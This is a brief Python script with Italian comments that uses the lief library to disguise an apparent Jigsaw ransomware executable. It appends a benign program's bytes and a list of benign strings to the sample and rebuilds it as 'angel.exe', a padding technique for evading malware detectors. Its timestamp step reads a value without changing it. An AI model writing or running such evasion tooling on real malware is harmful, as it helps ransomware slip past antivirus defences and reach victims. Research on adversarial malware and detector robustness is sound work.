import lief

path_benign_exe = 'good.exe'
path_strings_exe = 'good.txt'
path_bad_exe = 'jigsaw_compress.exe'
path_angel_exe = 'angel.exe'

with open(path_bad_exe, 'rb') as f:
    bytez = f.read()

# AGGIUNGI BINARIO
with open(path_benign_exe, 'rb') as f:
    good_binary = f.read()

bytez += good_binary

#AGGIUNGI STRINGHE
with open(path_strings_exe, 'r') as f:
    good_strings = f.read()
#for i in range(10): #ggiunge le stringe 10 volte
bytez += bytes(good_strings, encoding='ascii')
 
#MODIFICA TIMESTAMP
binary = lief.PE.parse(list(bytez))
binary.header.time_date_stamps

builder = lief.PE.Builder(binary)
builder.build_imports(False)
builder.build()
builder.write(path_angel_exe)
